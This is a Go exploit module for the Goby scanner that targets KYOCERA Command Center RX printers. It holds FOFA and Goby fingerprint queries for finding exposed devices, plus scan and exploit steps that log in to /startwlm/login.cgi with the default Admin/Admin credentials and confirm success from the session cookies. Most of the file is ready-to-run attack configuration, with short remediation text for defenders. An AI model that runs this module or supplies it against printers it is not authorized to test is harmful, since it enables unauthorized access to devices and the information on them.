package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "KYOCERA-multiple printer Command-Center-RX Default Password",
    "Description": "<p>KYOCERA-Multiple printers are A4 black and white high-speed commercial four-in-one multi-functional all-in-one machine.</p><p>The command center of this series of printers has Admin/Admin default password.</p>",
    "Product": "KYOCERA-Printer",
    "Homepage": "https://www.kyoceraconnect.com/",
    "DisclosureDate": "2022-11-21",
    "Author": "wmqfree@163.com",
    "FofaQuery": "(header=\"Server: KM-MFP-http\" || banner=\"Server: KM-MFP-http\" || title=\"Kyocera Command Center\" || body=\"var modelname=\\\"FS-\" || (body=\"var currentpage=\\\"\\\";\" && body=\"var modelname=\") || (body=\"Kyocera TASKalfa \" && title=\"IPP Attributes\") || (body=\"TASKalfa \" && title=\"IPP Attributes\") || (protocol=\"snmp\" && banner=\"KYOCERA Printer\") || (banner=\"220\" && banner=\" FTP server.\" && banner=\"214- FTPD supported commands(RFC959 subset):\") || ((banner=\"TASKalfa \" || banner=\"ECOSYS\") && (protocol=\"printer-job-language\" || protocol=\"ftp\"))) && body=\"src=\\\"/startwlm/Start_Wlm.htm\\\"\"",
    "GobyQuery": "(header=\"Server: KM-MFP-http\" || banner=\"Server: KM-MFP-http\" || title=\"Kyocera Command Center\" || body=\"var modelname=\\\"FS-\" || (body=\"var currentpage=\\\"\\\";\" && body=\"var modelname=\") || (body=\"Kyocera TASKalfa \" && title=\"IPP Attributes\") || (body=\"TASKalfa \" && title=\"IPP Attributes\") || (protocol=\"snmp\" && banner=\"KYOCERA Printer\") || (banner=\"220\" && banner=\" FTP server.\" && banner=\"214- FTPD supported commands(RFC959 subset):\") || ((banner=\"TASKalfa \" || banner=\"ECOSYS\") && (protocol=\"printer-job-language\" || protocol=\"ftp\"))) && body=\"src=\\\"/startwlm/Start_Wlm.htm\\\"\"",
    "Level": "1",
    "Impact": "<p>KYOCERA-Many printers Command-Center-RX have default passwords. Attackers can use the default password Admin/Admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/startwlm/login.cgi",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "{{{fixedhostinfo}}}/startwlm/Start_Wlm.htm",
                    "Cookie": "rtl=0; css=1"
                },
                "data_type": "text",
                "data": "okhtmfile=%2Fstartwlm%2FStart_Wlm.htm&func=authLogin&arg03_LoginType=_mode_off&arg04_LoginFrom=_wlm_login&arg01_UserName=Admin&arg02_Password=Admin&arg03_LoginType=_mode_off&arg05_AccountId=&arg06_DomainName="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: level=1",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: cert_id",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/startwlm/login.cgi",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Referer": "{{{fixedhostinfo}}}/startwlm/Start_Wlm.htm",
                    "Cookie": "rtl=0; css=1"
                },
                "data_type": "text",
                "data": "okhtmfile=%2Fstartwlm%2FStart_Wlm.htm&func=authLogin&arg03_LoginType=_mode_off&arg04_LoginFrom=_wlm_login&arg01_UserName=Admin&arg02_Password=Admin&arg03_LoginType=_mode_off&arg05_AccountId=&arg06_DomainName="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: cert_id",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Set-Cookie: level=1",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|Admin/Admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "KYOCERA-多款打印机 Command-Center-RX 默认口令",
            "Product": "KYOCERA-打印机",
            "Description": "<p>KYOCERA-多款打印机是A4黑白高速商用四合一多功能一体机。<br></p><p>这系列打印机的命令中心存在Admin/Admin默认口令</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位数。<br></p><p>2、如非必要，禁止公网访问该管理系统。<br></p>",
            "Impact": "<p>KYOCERA-多款打印机Command-Center-RX存在默认口令，攻击者可未授权使用默认口令Admin/Admin登录系统后台，执行其他敏感操作，获取更多敏感信息。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "KYOCERA-multiple printer Command-Center-RX Default Password",
            "Product": "KYOCERA-Printer",
            "Description": "<p>KYOCERA-Multiple printers are A4 black and white high-speed commercial four-in-one multi-functional all-in-one machine.</p><p>The command center of this series of printers has Admin/Admin default password.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, etc., and the number of digits should be greater than 8 digits.</p><p>2. If it is not necessary, the public network is prohibited from accessing the management system.</p>",
            "Impact": "<p>KYOCERA-Many printers Command-Center-RX have default passwords. Attackers can use the default password Admin/Admin to log in to the system background without authorization, perform other sensitive operations, and obtain more sensitive information.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
